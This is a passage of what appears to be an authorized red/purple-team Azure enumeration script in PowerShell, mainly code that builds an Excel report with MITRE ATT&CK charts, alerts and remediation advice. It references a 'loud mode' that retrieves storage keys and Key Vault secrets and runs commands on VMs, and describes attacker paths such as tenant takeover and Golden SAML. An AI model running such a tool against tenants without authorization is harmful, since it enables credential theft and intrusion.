    $ws.Cells["Q$tacticStart"].Value = 'Tactic'; $ws.Cells["R$tacticStart"].Value = 'Count'
    $ws.Cells["Q$tacticStart`:R$tacticStart"].Style.Font.Bold = $true
    $r = $tacticStart + 1
    $tacticGrouped = $Report.MITREThreatMap | Group-Object Tactic | Sort-Object Count -Descending
    foreach ($t in $tacticGrouped) {
        $ws.Cells["Q$r"].Value = $t.Name; $ws.Cells["R$r"].Value = [int]$t.Count
        $r++
    }
    $tacticEndRow = $r - 1

    # --- CHART 1: Severity Pie ----------------------------------------------
    $chartRow0Based = $sectionHeaderStart  # row BELOW the section header (0-based, so this is 1-based row N+1)
    $pie = $ws.Drawings.AddChart('SeverityPie', [OfficeOpenXml.Drawing.Chart.eChartType]::Pie3D)
    $pie.SetPosition($chartRow0Based, 0, 0, 0)
    $pie.SetSize(520, 320)
    $pie.Title.Text = 'Severity Distribution (MITRE Mappings)'
    $pie.Legend.Position = [OfficeOpenXml.Drawing.Chart.eLegendPosition]::Right
    $pieSeries = $pie.Series.Add("'Executive Summary'!R2:R$sevEndRow", "'Executive Summary'!Q2:Q$sevEndRow")
    $pieSeries.Header = 'Severity'
    try { $pieSeries.DataLabel.ShowPercent = $true; $pieSeries.DataLabel.ShowCategory = $false } catch { }

    # --- CHART 2: Tactic Column Chart ---------------------------------------
    $bar = $ws.Drawings.AddChart('TacticBar', [OfficeOpenXml.Drawing.Chart.eChartType]::ColumnClustered)
    $bar.SetPosition($chartRow0Based, 0, 7, 0)
    $bar.SetSize(620, 320)
    $bar.Title.Text = 'Findings by MITRE ATT&CK Tactic'
    $bar.Legend.Remove()
    $barSeries = $bar.Series.Add("'Executive Summary'!R$($tacticStart + 1):R$tacticEndRow",
                                 "'Executive Summary'!Q$($tacticStart + 1):Q$tacticEndRow")
    $barSeries.Header = 'Count'
    try { $barSeries.DataLabel.ShowValue = $true } catch { }

    # --- TOP HIGH-VALUE FINDINGS TABLE ---------------------------------------
    # The charts above occupy ~16 rows of vertical space. Start the next section
    # two rows below that so the grid stays visually breathable. $sectionHeaderStart
    # is 9 for default KPIs or 12 when MicroBurst KPIs shifted things down.
    $topFindingsHeaderRow = $sectionHeaderStart + 18
    & $sectionHeader "A$topFindingsHeaderRow`:N$topFindingsHeaderRow" 'TOP HIGH-VALUE FINDINGS (Critical + High severity)'
    $ws.Row($topFindingsHeaderRow).Height = 22

    # Table headers
    $hdrRow = $topFindingsHeaderRow + 1
    $headers = @('Priority','Category','Count','HighValueCount','Severity','Tactic','MITRE ID','Attacker Use Case')
    $colLetters = @('A','B','C','D','E','F','G','H')
    for ($i = 0; $i -lt $headers.Count; $i++) {
        $cell = $ws.Cells["$($colLetters[$i])$hdrRow"]
        $cell.Value = $headers[$i]
        $cell.Style.Font.Bold = $true
        $cell.Style.Font.Color.SetColor($white)
        $cell.Style.Fill.PatternType = [OfficeOpenXml.Style.ExcelFillStyle]::Solid
        $cell.Style.Fill.BackgroundColor.SetColor($navy)
    }
    # Merge the use-case column across H..N for readability
    $ws.Cells["H$hdrRow`:N$hdrRow"].Merge = $true

    # Rows
    $topFindings = $Report.MITREThreatMap |
        Where-Object { $_.Severity -in @('Critical','High') } |
        Sort-Object @{Expression={ switch ($_.Severity) { 'Critical'{0};'High'{1};default{2} } }},
                    @{Expression='HighValueCount'; Descending=$true},
                    @{Expression='Count';          Descending=$true} |
        Select-Object -First 15

    $r = $hdrRow + 1
    $priority = 1
    foreach ($f in $topFindings) {
        $ws.Cells["A$r"].Value = $priority
        $ws.Cells["B$r"].Value = $f.Category
        $ws.Cells["C$r"].Value = [int]$f.Count
        $ws.Cells["D$r"].Value = [int]$f.HighValueCount
        $ws.Cells["E$r"].Value = $f.Severity
        $ws.Cells["F$r"].Value = $f.Tactic
        $ws.Cells["G$r"].Value = $f.MitreId
        $ws.Cells["H$r`:N$r"].Merge = $true
        $ws.Cells["H$r"].Value = $f.AttackerUseCase
        $ws.Cells["H$r"].Style.WrapText = $true
        # Color the Severity cell
        $sevCell = $ws.Cells["E$r"]
        $sevCell.Style.Fill.PatternType = [OfficeOpenXml.Style.ExcelFillStyle]::Solid
        $sevCell.Style.Font.Bold = $true
        $sevCell.Style.Font.Color.SetColor($white)
        switch ($f.Severity) {
            'Critical' { $sevCell.Style.Fill.BackgroundColor.SetColor($critRed) }
            'High'     { $sevCell.Style.Fill.BackgroundColor.SetColor($highOrg) }
        }
        $ws.Row($r).Height = 30
        $priority++; $r++
    }
    $topFindingsLastRow = $r - 1
    if ($topFindingsLastRow -ge ($hdrRow + 1)) {
        $ws.Cells["A$($hdrRow):N$topFindingsLastRow"].Style.Border.BorderAround([OfficeOpenXml.Style.ExcelBorderStyle]::Thin)
    }

    # --- CHART DATA BLOCK 2 (Identity + HighValueByCategory) -----------------
    $idDataStart = $r + 1
    $ws.Cells["Q$idDataStart"].Value = 'Principal'; $ws.Cells["R$idDataStart"].Value = 'Count'
    $ws.Cells["Q$idDataStart`:R$idDataStart"].Style.Font.Bold = $true
    $idRows = @(
        @{ Name='Users';              Count=$Report.Users.Count }
        @{ Name='Guest Users';        Count=$Report.GuestUsers.Count }
        @{ Name='Service Principals'; Count=$Report.ServicePrincipals.Count }
        @{ Name='App Registrations';  Count=$Report.AppRegistrations.Count }
        @{ Name='Groups';             Count=$Report.Groups.Count }
    )
    $ri = $idDataStart + 1
    foreach ($x in $idRows) {
        $ws.Cells["Q$ri"].Value = $x.Name; $ws.Cells["R$ri"].Value = [int]$x.Count
        $ri++
    }
    $idDataEnd = $ri - 1

    # High-Value count by category (top 10)
    $hvStart = $ri + 1
    $ws.Cells["Q$hvStart"].Value = 'Category'; $ws.Cells["R$hvStart"].Value = 'HighValueCount'
    $ws.Cells["Q$hvStart`:R$hvStart"].Style.Font.Bold = $true
    $topHV = $Report.MITREThreatMap |
        Where-Object { $_.HighValueCount -gt 0 } |
        Sort-Object HighValueCount -Descending |
        Select-Object -First 10
    $rh = $hvStart + 1
    foreach ($h in $topHV) {
        $ws.Cells["Q$rh"].Value = $h.Category
        $ws.Cells["R$rh"].Value = [int]$h.HighValueCount
        $rh++
    }
    $hvEnd = $rh - 1

    # --- Section + charts block 2 -------------------------------------------
    $blk2HeaderRow = $topFindingsLastRow + 2
    & $sectionHeader "A$blk2HeaderRow`:N$blk2HeaderRow" 'IDENTITY ATTACK SURFACE  &  HIGH-VALUE CATEGORY BREAKDOWN'
    $ws.Row($blk2HeaderRow).Height = 22

    # Identity pie
    $idPie = $ws.Drawings.AddChart('IdentityPie', [OfficeOpenXml.Drawing.Chart.eChartType]::Pie)
    $idPie.SetPosition($blk2HeaderRow, 0, 0, 0)   # row = header row + 1 (0-based)
    $idPie.SetSize(520, 320)
    $idPie.Title.Text = 'Identity Attack Surface'
    $idPie.Legend.Position = [OfficeOpenXml.Drawing.Chart.eLegendPosition]::Right
    $idSeries = $idPie.Series.Add("'Executive Summary'!R$($idDataStart + 1):R$idDataEnd",
                                  "'Executive Summary'!Q$($idDataStart + 1):Q$idDataEnd")
    $idSeries.Header = 'Principals'
    try { $idSeries.DataLabel.ShowPercent = $true } catch { }

    # HV bar (horizontal)
    $hvBar = $ws.Drawings.AddChart('HighValueBar', [OfficeOpenXml.Drawing.Chart.eChartType]::BarClustered)
    $hvBar.SetPosition($blk2HeaderRow, 0, 7, 0)
    $hvBar.SetSize(620, 320)
    $hvBar.Title.Text = 'Top High-Value Counts by Category'
    $hvBar.Legend.Remove()
    if ($hvEnd -ge ($hvStart + 1)) {
        $hvSeries = $hvBar.Series.Add("'Executive Summary'!R$($hvStart + 1):R$hvEnd",
                                      "'Executive Summary'!Q$($hvStart + 1):Q$hvEnd")
        $hvSeries.Header = 'HighValueCount'
        try { $hvSeries.DataLabel.ShowValue = $true } catch { }
    }

    # --- KEY VULNERABILITY ALERTS ------------------------------------------
    $alertHeaderRow = $blk2HeaderRow + 17
    & $sectionHeader "A$alertHeaderRow`:N$alertHeaderRow" 'KEY VULNERABILITY ALERTS'
    $ws.Row($alertHeaderRow).Height = 22

    $alerts = @()
    if ($dangerousPerms -gt 0)                                                              { $alerts += "$dangerousPerms dangerous Graph API permission grants (RoleManagement.ReadWrite.Directory / Application.ReadWrite.All / full_access_as_app class). Any single compromised app = tenant takeover via token." }
    if ($Report.AppFederatedCredentials.Count -gt 0)                                        { $alerts += "$($Report.AppFederatedCredentials.Count) workload-identity federated credentials (FICs). Golden SAML / GitHub-OIDC persistence territory - every FIC is a passwordless path in." }
    $privRoleHolders = $Report.DirectoryRoleAssignments.Count + $Report.PrivilegedServicePrincipals.Count
    if ($privRoleHolders -gt 0)                                                             { $alerts += "$privRoleHolders principals hold tier-0 directory roles ($($Report.DirectoryRoleAssignments.Count) assignments + $($Report.PrivilegedServicePrincipals.Count) privileged SPNs)." }
    if ($Report.PIMEligibleRoles.Count -gt 0)                                               { $alerts += "$($Report.PIMEligibleRoles.Count) PIM-eligible role assignments - dormant privilege ready to activate." }
    if ($Report.PrivilegedGroups.Count -gt 0)                                               { $alerts += "$($Report.PrivilegedGroups.Count) role-assignable (tier-0) groups - adding a member = directory role grant." }
    if ($Report.StaleUsers.Count -gt 0)                                                     { $alerts += "$($Report.StaleUsers.Count) stale-but-enabled accounts (>90 days idle) - password-spray targets nobody would notice logging in." }
    $noMfa = @($Report.MFAStatus | Where-Object { $_.IsMfaRegistered -ne $true }).Count
    if ($noMfa -gt 0)                                                                       { $alerts += "$noMfa accounts with NO MFA registered - zero-friction AiTM / spray targets." }
    $riskyNsg = @($Report.NSGRules | Where-Object { $_.RiskyService -and $_.RiskyService -ne '' }).Count
    if ($riskyNsg -gt 0)                                                                    { $alerts += "$riskyNsg NSG rules Allow inbound from 0.0.0.0/0 on admin ports (RDP/SSH/SMB/WinRM/SQL)." }
    $pubBlob = @($Report.StorageAccounts | Where-Object { $_.AllowBlobPublicAccess -eq $true }).Count
    if ($pubBlob -gt 0)                                                                     { $alerts += "$pubBlob storage accounts permit public-blob access - data exfil / credential leakage risk (T1530)." }
    $widcard = @($Report.CustomRoles | Where-Object { ($_.Actions -match '\*') -or ($_.Actions -match 'Microsoft.Authorization/\*') }).Count
    if ($widcard -gt 0)                                                                     { $alerts += "$widcard custom RBAC roles contain wildcard or Authorization actions - hidden god-mode roles." }
    if ($Report.ClassicAdmins.Count -gt 0)                                                  { $alerts += "$($Report.ClassicAdmins.Count) legacy classic (co-)administrators - often miss modern RBAC review." }
    if ($Report.GuestUsers.Count -gt 0)                                                     { $alerts += "$($Report.GuestUsers.Count) B2B guest accounts from external tenants (T1199 Trusted Relationship surface)." }
    if ($Report.FederationSettings.Count -gt 0)                                             { $alerts += "$($Report.FederationSettings.Count) federated domains / trusts - if an on-prem token signer is owned, Golden SAML is in reach." }
    $longLivedCreds = @($Report.AppCredentials | Where-Object { $_.EndDateTime -and ([DateTime]$_.EndDateTime) -gt (Get-Date).AddYears(1) }).Count
    if ($longLivedCreds -gt 0)                                                              { $alerts += "$longLivedCreds app credentials expire > 1 year out - long-lived persistence artifacts." }

    # --- MicroBurst-inspired alerts ---
    if ($Report.ExternalSubdomains.Count -gt 0) {
        $juicySurface = @($Report.ExternalSubdomains | Where-Object { $_.Service -in @('KeyVault','AzureSQL','CosmosDB','AppService-Kudu','Storage-Blob','DataLakeGen1') }).Count
        $alerts += "$($Report.ExternalSubdomains.Count) external Azure subdomains resolved via DNS ($juicySurface on high-value service suffixes) - attacker has a tenant fingerprint without a credential."
    }
    if ($Report.ExternalBlobs.Count -gt 0) {
        $alerts += "$($Report.ExternalBlobs.Count) publicly-listable blob containers found via unauth enumeration - review contents and disable anonymous access (T1530)."
    }
    if ($Report.CredentialExposure.Count -gt 0) {
        $akCritical = @($Report.CredentialExposure | Where-Object { $_.Severity -eq 'Critical' }).Count
        $akHigh     = @($Report.CredentialExposure | Where-Object { $_.Severity -eq 'High' }).Count
        $alerts += "$($Report.CredentialExposure.Count) credential-storage locations inventoried ($akCritical Critical / $akHigh High). These are the named targets for any follow-up loud credential pull."
    }
    if ($Report.ArcMachines.Count -gt 0) {
        $connected = @($Report.ArcMachines | Where-Object { $_.Status -eq 'Connected' }).Count
        $alerts += "$($Report.ArcMachines.Count) Arc-connected machines ($connected reporting Connected). ARM runCommand on an Arc machine = RCE on that on-prem / hybrid host - treat them as VMs for ROE purposes."
    }
    if ($Report.ArcKubernetes.Count -gt 0) {
        $alerts += "$($Report.ArcKubernetes.Count) Arc-connected Kubernetes clusters - listClusterUserCredential pulls a working kubeconfig via ARM RBAC."
    }
    if ($Report.LoudStorageKeys.Count -gt 0) {
        $alerts += "LOUD MODE RAN: $($Report.LoudStorageKeys.Count) storage account keys retrieved - every SAS / anonymous-equivalent path on those accounts is now in the workbook. Rotate immediately after the engagement."
    }
    if ($Report.LoudKeyVaultSecrets.Count -gt 0) {
        $alerts += "LOUD MODE RAN: $($Report.LoudKeyVaultSecrets.Count) Key Vault secret values pulled - rotate every affected secret and review KV diagnostic logs for the operator's retrieval pattern as a detection baseline."
    }
    if ($Report.LoudCommandExecution.Count -gt 0) {
        $alerts += "LOUD MODE RAN: $($Report.LoudCommandExecution.Count) VMs had commands executed via runCommand - verify these are visible in Activity Log + Defender for Cloud alerts."
    }

    if ($alerts.Count -eq 0) { $alerts += 'No high-severity findings surfaced in the enumerated scope (either scope was narrow, or controls are holding up).' }

    $r = $alertHeaderRow + 1
    foreach ($a in $alerts) {
        $cells = $ws.Cells["A$r`:N$r"]
        $cells.Merge = $true
        $cells.Value = "  - $a"
        $cells.Style.WrapText = $true
        $cells.Style.VerticalAlignment = [OfficeOpenXml.Style.ExcelVerticalAlignment]::Center
        $ws.Row($r).Height = 22
        $r++
    }
    $alertsLastRow = $r - 1

    # --- RECOMMENDATIONS ----------------------------------------------------
    $recHeaderRow = $alertsLastRow + 2
    & $sectionHeader "A$recHeaderRow`:N$recHeaderRow" 'RECOMMENDED PURPLE-TEAM ACTIONS'
    $ws.Row($recHeaderRow).Height = 22

    $recs = @(
        'Triage every AppPermissions row with IsDangerous=true: revoke, rotate client secrets, add CA policies that require MFA on the app.',
        'Investigate every AppFederatedCredentials entry - validate the issuer/subject pair belongs to a sanctioned workload (GitHub repo, ADO pipeline, etc.) and not a lookalike.',
        'Disable any StaleUsers row where DaysStale > 180 and the account is not a known service / break-glass identity.',
        'Require MFA via Conditional Access for every account missing registration (join MFAStatus to Users on UserPrincipalName).',
        'Close any NSGRules row flagged with a RiskyService - no RDP/SSH/SMB/WinRM from 0.0.0.0/0. Put those behind Bastion or a JIT VPN.',
        'Turn off AllowBlobPublicAccess at the subscription level via Azure Policy; exceptions should be named and reviewed.',
        'Audit CustomRoles with wildcard Actions. Replace with least-privilege equivalents; alert on their use.',
        'Rotate any AppCredentials expiring > 12 months out; move to workload identity / federated credentials where possible.',
        'Review PrivilegedGroups (isAssignableToRole) membership on a quarterly cadence - every member = directory role grant.',
        'Confirm ClassicAdmins list matches the documented break-glass / legacy-billing roster; remove the rest.',
        'Test SOC detections named in the MITREThreatMap "SuggestedDetection" column against this run - missing alerts mark detection gaps.',
        'Review ExternalSubdomains rows - every unnecessary public-facing FQDN is free reconnaissance for an attacker. Consider private endpoints where service-level public exposure is not required.',
        'Disable anonymous access on every row in ExternalBlobs; replace with SAS or Private Endpoint where public distribution is still required.',
        'Treat the CredentialExposure sheet as a rotation checklist - anything with Severity=Critical should be rotated on a defined cadence and migrated to workload identity / managed identity where feasible.',
        'For Arc-connected machines: restrict runCommand RBAC to a named break-glass group, and wire an Activity Log alert on Microsoft.HybridCompute/machines/runCommands/action.'
    )
    # Conditional recommendation based on whether loud mode was executed
    if ($Report.LoudStorageKeys.Count -gt 0 -or $Report.LoudKeyVaultSecrets.Count -gt 0 -or $Report.LoudCommandExecution.Count -gt 0) {
        $recs += 'LOUD mode was executed: rotate every secret/key pulled, coordinate with SOC to validate that Sentinel/Defender alerts fired, and archive this workbook as engagement evidence per ROE.'
    } else {
        $recs += 'Consider a scoped LOUD-mode re-run in a lab tenant (or with SOC coordination in prod) to validate detection response.'
    }
    $r = $recHeaderRow + 1
    foreach ($rec in $recs) {
        $cells = $ws.Cells["A$r`:N$r"]
        $cells.Merge = $true
        $cells.Value = "  - $rec"
        $cells.Style.WrapText = $true
        $cells.Style.VerticalAlignment = [OfficeOpenXml.Style.ExcelVerticalAlignment]::Center
        $ws.Row($r).Height = 24
        $r++
    }

    # Hide the chart-source columns so the sheet looks clean
    17..20 | ForEach-Object { $ws.Column($_).Hidden = $true }

    Write-Host "    [+] Executive Summary built ($($topFindings.Count) top findings, $($alerts.Count) alerts)." -ForegroundColor Green
}

# =============================================================================
# STEP 7: Run selected enumeration(s)
# =============================================================================
switch ($Choice) {
    "1" { Enumerate-Subscriptions }
    "2" { Enumerate-Users }
    "3" { Enumerate-ServicePrincipals }
    "4" { Enumerate-PrivilegedIdentity }
    "5" { Enumerate-AzureRbac }
    "6" { Enumerate-JuicyResources }
    "7" { Enumerate-NetworkExposure }
    "8" { Enumerate-Federation }
    "9" { Enumerate-ConditionalAccess }
    "X" {
        # External attack surface benefits from already having resource names to
        # seed permutations, so run a light Subscriptions sweep first if the
        # operator picked X standalone.
        if ($Report.Resources.Count -eq 0) { Enumerate-Subscriptions }
        if ($Report.StorageAccounts.Count -eq 0) { Enumerate-JuicyResources }
        Enumerate-ExternalAttackSurface
    }
    "C" {
        if ($Report.StorageAccounts.Count -eq 0) { Enumerate-JuicyResources }
        Enumerate-CredentialExposure
    }
    "H" {
        if ($Report.Subscriptions.Count -eq 0) { Enumerate-Subscriptions }
        Enumerate-ArcHybridInventory
    }
    "L" {
        # Loud mode depends on having resource inventory for targeting
        if ($Report.Resources.Count -eq 0) { Enumerate-Subscriptions }
        if ($Report.StorageAccounts.Count -eq 0) { Enumerate-JuicyResources }
        Enumerate-LoudMode
    }
    "A" {
        Enumerate-Subscriptions
        Enumerate-Users
        Enumerate-ServicePrincipals
        Enumerate-PrivilegedIdentity
        Enumerate-AzureRbac
        Enumerate-JuicyResources
        Enumerate-NetworkExposure
        Enumerate-Federation
        Enumerate-ConditionalAccess
        # MicroBurst-inspired read-only modules included in "A" (loud mode is NOT)
        Enumerate-ExternalAttackSurface
        Enumerate-CredentialExposure
        Enumerate-ArcHybridInventory
    }
    default {
        Write-Host "[!] Invalid choice. Exiting." -ForegroundColor Red
        Disconnect-AzAccount | Out-Null
        exit
    }
}

# Build the MITRE ATT&CK pivot sheet AFTER all enumeration has finished so that
# every Count / HighValueCount column reflects final state. Runs for every
# enumeration choice, not just "A", because any partial scope still benefits
# from the technique mapping for whatever data it DID gather.
Build-MITREThreatMap

# =============================================================================
# STEP 8: Build report
# =============================================================================

$Metadata = @(
    [PSCustomObject]@{ Field='RunTimestamp';          Value=(Get-Date).ToString('s') }
    [PSCustomObject]@{ Field='Operator';              Value=$OperatorUpn }
    [PSCustomObject]@{ Field='TenantIdProvided';      Value=$TenantId }
    [PSCustomObject]@{ Field='TenantIdResolved';      Value=$ResolvedTenant }
    [PSCustomObject]@{ Field='EnumerationChoice';     Value=$Choice }
    [PSCustomObject]@{ Field='Hostname';              Value=$env:COMPUTERNAME }
    [PSCustomObject]@{ Field='User';                  Value=$env:USERNAME }
    [PSCustomObject]@{ Field='PSVersion';             Value=$PSVersionTable.PSVersion.ToString() }
    [PSCustomObject]@{ Field='ScriptPath';            Value=$PSCommandPath }
)
# Counts for every populated sheet
foreach ($k in $Report.Keys) {
    if ($Report[$k].Count -gt 0) {
        $Metadata += [PSCustomObject]@{ Field="Count_$k"; Value=$Report[$k].Count }
    }
}

$ReportFullPath = $null

if ($script:ExcelAvailable) {
    $ReportFullPath = Join-Path -Path $ReportRootInput -ChildPath "T1526_Enumeration_$Timestamp.xlsx"
    Write-Host "`n[*] Writing Excel report: $ReportFullPath" -ForegroundColor Cyan

    $excelCommon = @{
        Path         = $ReportFullPath
        AutoSize     = $true
        BoldTopRow   = $true
        FreezeTopRow = $true
        AutoFilter   = $true
    }

    $Metadata | Export-Excel @excelCommon -WorksheetName "Metadata" -TableName "Metadata" -TableStyle Medium9

    # Write the MITRE ATT&CK threat-map FIRST (after Metadata) so it shows up as
    # tab #2 when the workbook is opened - executive / reviewer landing page.
    # Uses a distinct table style (Medium11) to visually separate it from the
    # raw-data sheets.
    if ($Report.Contains('MITREThreatMap') -and $Report.MITREThreatMap.Count -gt 0) {
        try {
            $Report.MITREThreatMap |
                Sort-Object @{Expression = {
                    switch ($_.Severity) {
                        'Critical' { 0 }
                        'High'     { 1 }
                        'Medium'   { 2 }
                        'Low'      { 3 }
                        default    { 4 }
                    }
                }}, Tactic, MitreId |
                Export-Excel @excelCommon -WorksheetName 'MITREThreatMap' -TableName 'MITREThreatMap' -TableStyle Medium11
            Write-Host "    [+] Sheet: MITREThreatMap ($($Report.MITREThreatMap.Count) rows) [landing page]" -ForegroundColor Green
        } catch {
            Write-Host "    [!] Sheet MITREThreatMap failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
    }

    foreach ($sheet in $Report.Keys) {
        # Skip MITREThreatMap here - already written above as the landing page.
        if ($sheet -eq 'MITREThreatMap') { continue }
        if ($Report[$sheet].Count -gt 0) {
            try {
                $Report[$sheet] | Export-Excel @excelCommon -WorksheetName $sheet -TableName $sheet -TableStyle Medium2
                Write-Host "    [+] Sheet: $sheet ($($Report[$sheet].Count) rows)" -ForegroundColor Green
            } catch {
                Write-Host "    [!] Sheet $sheet failed: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
    }

    # -------------------------------------------------------------------------
    # Visual pivot sheet: embed a rendered MITRE ATT&CK heatmap PNG so reviewers
    # get a one-glance picture of severity coverage across tactics. We add the
    # sheet AFTER every data sheet is written by reopening the workbook with
    # Open-ExcelPackage (ImportExcel's OOXML package handle) because
    # Export-Excel itself doesn't accept a raw image parameter.
    # -------------------------------------------------------------------------
    if ($Report.MITREThreatMap.Count -gt 0) {
        $graphImagePath = Join-Path -Path $env:TEMP -ChildPath "MITREThreatMapGraph_$Timestamp.png"
        $pkg = $null
        try {
            # Render the PNG first (outside the package so we don't hold the
            # workbook open longer than needed).
            New-MITREThreatMapGraphImage -OutputImagePath $graphImagePath

            $pkg = Open-ExcelPackage -Path $ReportFullPath
            try {
                # ---------------------------------------------------------------
                # (1) MITRE Threat Map Graph tab - visual heatmap PNG
                # ---------------------------------------------------------------
                $existing = $pkg.Workbook.Worksheets | Where-Object { $_.Name -eq 'MITRE Threat Map Graph' }
                if ($existing) { $pkg.Workbook.Worksheets.Delete('MITRE Threat Map Graph') }

                $graphWs = $pkg.Workbook.Worksheets.Add('MITRE Threat Map Graph')
                $graphWs.View.ShowGridLines = $false

                $graphWs.Cells['B2'].Value = "MITRE ATT&CK Coverage Heatmap - see 'Executive Summary' and 'MITREThreatMap' tabs for detail"
                $graphWs.Cells['B2'].Style.Font.Bold = $true
                $graphWs.Cells['B2'].Style.Font.Size = 14

                $imgFile = [System.IO.FileInfo]$graphImagePath
                $pic = $graphWs.Drawings.AddPicture('MITREThreatMapGraph', $imgFile)
                $pic.SetPosition(3, 0, 1, 0)

                # ---------------------------------------------------------------
                # (2) Executive Summary tab - KPIs, charts, vulns, recs
                # ---------------------------------------------------------------
                try {
                    Add-ExecutiveSummarySheet -Pkg $pkg
                } catch {
                    Write-Host "    [!] Executive Summary failed: $($_.Exception.Message)" -ForegroundColor Yellow
                    Write-Host "        (Workbook still contains every other tab.)" -ForegroundColor Yellow
                }

                # ---------------------------------------------------------------
                # (3) Final tab order:
                #     MITRE Threat Map Graph  -> first
                #     Executive Summary       -> second
                #     MITREThreatMap          -> third
                #     [all other data sheets] -> middle (existing order)
                #     Metadata                -> last
                # ---------------------------------------------------------------
                $tabOrder = @(
                    @{ Action='Start'; Name='MITRE Threat Map Graph' }
                    @{ Action='After'; Name='Executive Summary';    Ref='MITRE Threat Map Graph' }
                    @{ Action='After'; Name='MITREThreatMap';       Ref='Executive Summary' }
                    @{ Action='End';   Name='Metadata' }
                )
                foreach ($mv in $tabOrder) {
                    $sheetExists = $pkg.Workbook.Worksheets | Where-Object { $_.Name -eq $mv.Name }
                    if (-not $sheetExists) { continue }
                    try {
                        switch ($mv.Action) {
                            'Start' { $pkg.Workbook.Worksheets.MoveToStart($mv.Name) }
                            'End'   { $pkg.Workbook.Worksheets.MoveToEnd($mv.Name) }
                            'After' {
                                if ($pkg.Workbook.Worksheets | Where-Object { $_.Name -eq $mv.Ref }) {
                                    $pkg.Workbook.Worksheets.MoveAfter($mv.Name, $mv.Ref)
                                }
                            }
                        }
                    } catch {
                        # Non-fatal: workbook still ships, just with default order
                        Write-Host "        [!] Tab reorder ($($mv.Name)) failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
                    }
                }

                Close-ExcelPackage $pkg
                $pkg = $null
                Write-Host "    [+] Sheet: MITRE Threat Map Graph (embedded PNG, $([int]((Get-Item $graphImagePath).Length / 1024)) KB)" -ForegroundColor Green
                Write-Host "    [+] Sheet: Executive Summary (native Excel charts)" -ForegroundColor Green
                Write-Host "    [+] Tab order: Graph -> ExecSummary -> MITREThreatMap -> data -> Metadata" -ForegroundColor Green
            } catch {
                # Release the package on error so the .xlsx isn't left locked.
                if ($pkg) { try { Close-ExcelPackage $pkg -NoSave } catch { }; $pkg = $null }
                throw
            }
        } catch {
            Write-Host "    [!] Graph / Executive Summary build failed: $($_.Exception.Message)" -ForegroundColor Yellow
            Write-Host "        (Raw data tabs and the text MITREThreatMap tab are unaffected.)" -ForegroundColor Yellow
        } finally {
            if (Test-Path $graphImagePath) {
                Remove-Item $graphImagePath -Force -ErrorAction SilentlyContinue
            }
        }
    }
} else {
    $ReportFolder = Join-Path -Path $ReportRootInput -ChildPath "T1526_Enumeration_$Timestamp"
    New-Item -ItemType Directory -Path $ReportFolder -Force | Out-Null
    $ReportFullPath = $ReportFolder

    Write-Host "`n[*] Writing CSV report: $ReportFolder" -ForegroundColor Cyan
    $Metadata | Export-Csv -Path (Join-Path $ReportFolder "Metadata.csv") -NoTypeInformation -Encoding UTF8

    foreach ($sheet in $Report.Keys) {
        if ($Report[$sheet].Count -gt 0) {
            $csv = Join-Path $ReportFolder "$sheet.csv"
            $Report[$sheet] | Export-Csv -Path $csv -NoTypeInformation -Encoding UTF8
            Write-Host "    [+] CSV: $sheet.csv ($($Report[$sheet].Count) rows)" -ForegroundColor Green
        }
    }
}

# =============================================================================
# STEP 9: Summary + SOC pointers
# =============================================================================
Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "   TTP T1526 Complete" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "[*] Report : $ReportFullPath" -ForegroundColor Green
Write-Host ""
Write-Host "[*] Workbook structure:" -ForegroundColor Cyan
Write-Host "     Tab  1 : MITRE Threat Map Graph   (visual ATT&CK heatmap)"
Write-Host "     Tab  2 : Executive Summary        (KPIs, charts, top findings, recommendations)"
Write-Host "     Tab  3 : MITREThreatMap           ($($Report.MITREThreatMap.Count) technique rows)"
Write-Host "     Tabs 4+: Raw enumeration sheets   (Users, SPNs, RBAC, NSGs, KVs, etc.)"
Write-Host "     Last   : Metadata                 (run provenance)"
Write-Host ""
Write-Host "[*] High-value findings at a glance:" -ForegroundColor Cyan
Write-Host "     Global / priv role holders : $($Report.DirectoryRoleAssignments.Count) assignments, $($Report.PrivilegedServicePrincipals.Count) SPNs"
Write-Host "     PIM eligible roles         : $($Report.PIMEligibleRoles.Count)"
Write-Host "     Privileged (role-assignable) groups : $($Report.PrivilegedGroups.Count)"
Write-Host "     Dangerous API perm grants  : $(($Report.AppPermissions | Where-Object { $_.IsDangerous }).Count)"
Write-Host "     App federated credentials  : $($Report.AppFederatedCredentials.Count)"
Write-Host "     Stale-but-enabled users    : $($Report.StaleUsers.Count)"
Write-Host "     Public-blob storage accts  : $(($Report.StorageAccounts | Where-Object { $_.AllowBlobPublicAccess -eq $true }).Count)"
Write-Host "     Risky NSG rules (inet exp) : $(($Report.NSGRules | Where-Object { $_.RiskyService }).Count)"
Write-Host "     Custom RBAC roles          : $($Report.CustomRoles.Count)"
Write-Host "     Classic administrators     : $($Report.ClassicAdmins.Count)"
Write-Host ""

# MicroBurst-inspired module summary - only emitted if those modules produced data
$microBurstRan = ($Report.ExternalSubdomains.Count -gt 0) -or
                 ($Report.ExternalBlobs.Count -gt 0) -or
                 ($Report.CredentialExposure.Count -gt 0) -or
                 ($Report.ArcMachines.Count -gt 0) -or
                 ($Report.LoudStorageKeys.Count -gt 0)
if ($microBurstRan) {
    Write-Host "[*] MicroBurst-inspired modules:" -ForegroundColor Cyan
    Write-Host "     External Azure FQDNs (DNS) : $($Report.ExternalSubdomains.Count)"
    Write-Host "     Public blob containers     : $($Report.ExternalBlobs.Count)"
    Write-Host "     Credential-storage rows    : $($Report.CredentialExposure.Count)"
    Write-Host "     Arc machines               : $($Report.ArcMachines.Count)"
    Write-Host "     Arc K8s clusters           : $($Report.ArcKubernetes.Count)"
    Write-Host "     Arc SQL instances          : $($Report.ArcSqlInstances.Count)"
    if (($Report.LoudStorageKeys.Count + $Report.LoudKeyVaultSecrets.Count + $Report.LoudCommandExecution.Count) -gt 0) {
        Write-Host "     [LOUD] Storage keys pulled : $($Report.LoudStorageKeys.Count)" -ForegroundColor Red
        Write-Host "     [LOUD] KV secret values    : $($Report.LoudKeyVaultSecrets.Count)" -ForegroundColor Red
        Write-Host "     [LOUD] Automation creds    : $($Report.LoudAutomationCreds.Count) flagged (manual extract)" -ForegroundColor Red
        Write-Host "     [LOUD] VMs code-exec'd     : $($Report.LoudCommandExecution.Count)" -ForegroundColor Red
        Write-Host "     *** Coordinate with SOC + rotate every affected secret/key before closing engagement ***" -ForegroundColor Red
    }
    Write-Host ""
}
